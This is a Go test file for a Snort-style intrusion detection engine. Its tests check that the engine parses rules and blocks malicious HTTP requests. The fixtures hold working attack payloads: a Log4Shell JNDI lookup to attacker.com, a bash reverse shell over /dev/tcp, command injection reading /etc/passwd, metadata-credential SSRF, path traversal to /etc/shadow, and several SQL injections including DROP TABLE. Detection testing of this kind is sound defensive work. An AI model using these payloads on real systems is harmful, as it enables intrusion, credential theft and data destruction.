// Copyright 2026 Google LLC
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

package snort

import (
	"net/http"
	"strings"
	"testing"
)

func TestParseRule(t *testing.T) {
	raw := `drop tcp any any -> any any (msg:"Test Rule"; content:"evil"; nocase; sid:12345; rev:2; classtype:"bad-unknown";)`
	rule, err := ParseRule(raw)
	if err != nil {
		t.Fatalf("unexpected error parsing rule: %v", err)
	}

	if rule.Action != ActionDrop {
		t.Errorf("expected action drop, got %s", rule.Action)
	}
	if rule.SID != 12345 {
		t.Errorf("expected sid 12345, got %d", rule.SID)
	}
	if rule.Message != "Test Rule" {
		t.Errorf("expected msg 'Test Rule', got %q", rule.Message)
	}
	if len(rule.Contents) != 1 {
		t.Fatalf("expected 1 content, got %d", len(rule.Contents))
	}
	if rule.Contents[0].Pattern != "evil" || !rule.Contents[0].NoCase {
		t.Errorf("unexpected content option: %+v", rule.Contents[0])
	}
}

func TestParseHexContent(t *testing.T) {
	raw := `alert tcp any any -> any any (msg:"Hex Test"; content:"|0d 0a|malicious|00|"; sid:54321;)`
	rule, err := ParseRule(raw)
	if err != nil {
		t.Fatalf("unexpected error parsing rule: %v", err)
	}
	expected := "\r\nmalicious\x00"
	if rule.Contents[0].Pattern != expected {
		t.Errorf("expected decoded pattern %q, got %q", expected, rule.Contents[0].Pattern)
	}
}

func TestEngineDefaultRules(t *testing.T) {
	eng, err := DefaultEngine()
	if err != nil {
		t.Fatalf("failed to initialize DefaultEngine: %v", err)
	}

	if eng.RuleCount() == 0 {
		t.Fatalf("expected default rules to be loaded, got 0")
	}

	tests := []struct {
		name        string
		method      string
		rawURL      string
		headers     map[string]string
		body        string
		expectBlock bool
		expectedSID int
	}{
		{
			name:        "Legitimate API Request to LLM Provider",
			method:      "POST",
			rawURL:      "https://api.anthropic.com/v1/messages",
			headers:     map[string]string{"Content-Type": "application/json", "Authorization": "Bearer token123"},
			body:        `{"model":"claude-3-7-sonnet","messages":[{"role":"user","content":"Can you summarize this code?"}]}`,
			expectBlock: false,
		},
		{
			name:        "Legitimate GitHub REST Request",
			method:      "GET",
			rawURL:      "https://api.github.com/repos/google/ax/commits",
			headers:     map[string]string{"Accept": "application/vnd.github.v3+json"},
			body:        "",
			expectBlock: false,
		},
		{
			name:        "Log4Shell JNDI exploit in body",
			method:      "POST",
			rawURL:      "https://api.victim.com/search",
			headers:     map[string]string{"Content-Type": "application/x-www-form-urlencoded"},
			body:        "query=${jndi:ldap://attacker.com/exploit}",
			expectBlock: true,
			expectedSID: 1000001,
		},
		{
			name:        "Log4Shell in User-Agent header",
			method:      "GET",
			rawURL:      "https://api.victim.com/data",
			headers:     map[string]string{"User-Agent": "${jndi:rmi://10.0.0.1:1099/obj}"},
			body:        "",
			expectBlock: true,
			expectedSID: 1000001,
		},
		{
			name:        "Reverse Shell /dev/tcp payload",
			method:      "POST",
			rawURL:      "https://api.target.com/run",
			headers:     map[string]string{"Content-Type": "text/plain"},
			body:        "/bin/bash -i >& /dev/tcp/10.0.0.5/4444 0>&1",
			expectBlock: true,
			expectedSID: 1000003,
		},
		{
			name:        "Shell command injection attempting cat /etc/passwd",
			method:      "POST",
			rawURL:      "https://api.target.com/exec",
			headers:     map[string]string{},
			body:        "param=test; cat /etc/passwd",
			expectBlock: true,
			expectedSID: 1000006,
		},
		{
			name:        "SSRF AWS/Cloud instance metadata IP",
			method:      "GET",
			rawURL:      "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
			headers:     map[string]string{},
			body:        "",
			expectBlock: true,
			expectedSID: 1000030,
		},
		{
			name:        "SSRF GCP metadata internal hostname",
			method:      "GET",
			rawURL:      "http://metadata.google.internal/computeMetadata/v1/",
			headers:     map[string]string{},
			body:        "",
			expectBlock: true,
			expectedSID: 1000031,
		},
		{
			name:        "SSRF Loopback address",
			method:      "GET",
			rawURL:      "http://127.0.0.1:8080/admin",
			headers:     map[string]string{},
			body:        "",
			expectBlock: true,
			expectedSID: 1000032,
		},
		{
			name:        "Path Traversal directory climbing",
			method:      "GET",
			rawURL:      "https://target.com/download?file=../../../../etc/shadow",
			headers:     map[string]string{},
			body:        "",
			expectBlock: true,
			expectedSID: 1000020,
		},
		{
			name:        "URL-encoded Path Traversal",
			method:      "GET",
			rawURL:      "https://target.com/view?doc=..%2f..%2fconfig.json",
			headers:     map[string]string{},
			body:        "",
			expectBlock: true,
			expectedSID: 1000021,
		},
		{
			name:        "SQL Injection UNION SELECT",
			method:      "GET",
			rawURL:      "https://target.com/items?id=1%20UNION%20SELECT%20username,password%20FROM%20users",
			headers:     map[string]string{},
			body:        "",
			expectBlock: true,
			expectedSID: 1000040,
		},
		{
			name:        "SQL Injection classic OR tautology",
			method:      "POST",
			rawURL:      "https://target.com/login",
			headers:     map[string]string{"Content-Type": "application/json"},
			body:        `{"user":"admin' or '1'='1"}`,
			expectBlock: true,
			expectedSID: 1000041,
		},
		{
			name:        "SQL Injection stacked DROP TABLE",
			method:      "POST",
			rawURL:      "https://target.com/query",
			headers:     map[string]string{},
			body:        "id=5; DROP TABLE accounts",
			expectBlock: true,
			expectedSID: 1000042,
		},
		{
			name:        "SQL Injection time delay SLEEP()",
			method:      "GET",
			rawURL:      "https://target.com/products?cat=1%20and%20sleep(5)",
			headers:     map[string]string{},
			body:        "",
			expectBlock: true,
			expectedSID: 1000043,
		},
		{
			name:        "Vulnerability scanner User-Agent (sqlmap)",
			method:      "GET",
			rawURL:      "https://target.com/api/test",
			headers:     map[string]string{"User-Agent": "sqlmap/1.6#stable"},
			body:        "",
			expectBlock: true,
			expectedSID: 1000060,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			req, err := http.NewRequest(tt.method, tt.rawURL, strings.NewReader(tt.body))
			if err != nil {
				t.Fatalf("failed to create http.Request: %v", err)
			}
			for k, v := range tt.headers {
				req.Header.Set(k, v)
			}

			result := eng.InspectHTTPRequest(req, []byte(tt.body))
			if result.Blocked != tt.expectBlock {
				t.Fatalf("expected blocked=%v, got blocked=%v (result: %+v)", tt.expectBlock, result.Blocked, result)
			}

			if tt.expectBlock && tt.expectedSID != 0 {
				if result.MatchedRule == nil || result.MatchedRule.SID != tt.expectedSID {
					t.Errorf("expected rule SID %d, got %+v", tt.expectedSID, result.MatchedRule)
				}
			}
		})
	}
}
